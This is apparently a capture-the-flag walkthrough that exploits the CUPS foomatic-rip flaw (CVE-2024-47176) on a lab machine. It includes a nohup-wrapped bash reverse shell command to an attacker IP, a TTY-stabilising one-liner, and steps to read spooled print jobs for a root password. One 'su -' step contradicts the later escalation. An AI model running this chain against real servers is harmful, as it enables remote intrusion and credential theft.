I learned a ridiculous amount from this box — a lot of techniques I didn't know existed, so make sure you look back at this for a lot of different pentesting abilities. Here we go.

We start with a basic nmap scan which shows 2 ports open: 22 and 631.

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
631/tcp open  ipp     CUPS 2.4
|_http-title: Home - CUPS 2.4.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The nmap scan shows CUPS is running on 631, so this will probably be our attack vector. Navigating to 631 in Firefox, you'll see a printer page. This doesn't look inherently vulnerable, but if you look up CVEs for CUPS 2.4, you'll find `CVE-2024-47176`. This has 4 vulnerabilities, but the one we'll use is the **Foomatic Rip Line** vulnerability, as it has command execution capabilities. This is where we'll run our reverse shell.

If you actually wanted to exploit this yourself, you'd have to write a script to look like a printer and send it to the server, which is a lot of work. Luckily, ippsec has a script available on his GitHub.

> **Linked script:** the original notes embedded ippsec's `poc.py`.

The full command you'll use with this script (assuming you name it `poc.py`) is:

```bash
python3 poc.py <localaddress> <targetaddress> 'nohup bash -c "bash -i >& /dev/tcp/10.10.14.3/9001 0>&1" &'
```

This bash reverse shell is really good: not only did the revshells.com one not work, but it has the addition of `nohup`, which allows the reverse shell to run even when the service is terminated. The reason this works is because when you run the reverse shell without `nohup`, it attaches to the false printer service you made, which gets terminated every 5 minutes — terminating your reverse shell with it. `nohup` forks the process to a different PID entirely, allowing the revshell to work without problems. You also need the `&` at the end to background the process.

Another great tool I found was how to make stable and fully functional shells: [Stabilizing a shell (getting a fully functional TTY)](https://medium.com/@varunrajamirtharaj/stabilizing-a-shell-getting-a-fully-functional-tty-31232897f2f5).

After you get a stable shell, you need to look for the original printer job. With a little Google searching, you'll find the jobs should be in `/var/spool/cups`, but you can't actually `ls` anything in that directory. If you look at the permissions on the cups directory, you'll see the `lp` user only has execute privileges, but no read privileges. The goal is to find out what the file format should be, so you can `cat` the file.

To find this, you can use your shell (before using `stty raw -echo;fg`) to upload a print job of your own. First you `su -` to change to the root user, then run:

```bash
lpadmin -p RandomName -E -v file:///dev/null
```

You can look at this print job and run a print test page like you did before, and you'll see the name you put with an ID number. If you navigate to `/var/spool/cups`, you'll see your job populate and see that the file correlates to your job, i.e. `d0000#-001`. You can use this to guess the file you need to `cat`. If you go back to the original print page, you'll see the print job you want also has an ID number on the first page. If you `cat d0000#-001`, you'll see the contents of the file — `pass.txt` and something that looks like the password. If you want, you can send the file back to your terminal and use `ps2pdf` and `open` to look at it.

A more intuitive way to find the format is to look at the documentation: the [CUPS Design Description](https://www.cups.org/doc/spec-design.html) describes the format of print jobs as `d0000#-000#`. Reading the documentation and understanding it is very important. A simple Ctrl-F plus some healthy intuition would've also gotten you the correct flag.

If you use the password, you can become root and `cat` the root flag.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
